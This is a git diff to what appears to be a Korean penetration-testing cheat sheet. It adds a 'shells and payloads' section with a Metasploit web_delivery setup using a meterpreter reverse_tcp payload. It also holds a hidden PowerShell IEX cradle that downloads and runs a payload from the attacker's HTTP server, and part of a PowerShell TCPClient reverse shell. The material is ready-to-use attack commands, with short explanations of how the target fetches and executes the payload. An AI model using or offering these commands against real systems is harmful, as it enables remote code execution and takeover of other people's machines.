@@ -71,7 +71,7 @@ echo test | grep test
 
 
 
-## 포탄 및 페이로드
+## 쉘 및 페이로드
 
 
 
@@ -114,4 +114,30 @@ echo test | grep test
 
 ```
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$s
+```
+
+msfconsole 리버스 쉘
+
+```bash
+//web_delivery
+다음은 web_delivery 모듈을 사용하는 예시
+
+msfconsole
+use exploit/multi/script/web_delivery
+
+set SRVHOST 192.168.1.100
+set SRVPORT 8080
+set TARGET 2  # PowerShell
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 4444
+
+exploit
+
+공격자가 제공한 URI혹은  명령어를 목표 시스템에서 실행합니다. 예를 들어, PowerShell을 사용한 경우 다음과 같은 명령을 목표 시스템에서 실행할 수 있습니다:
+powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.100:8080/abc123'))"
+이 명령을 통해 목표 시스템은 공격자가 설정한 HTTP 서버에서 페이로드를 다운로드하고 실행하게 됩니다.
+
+마지막으로 쉘을 얻기 위해
+session 1
 ```
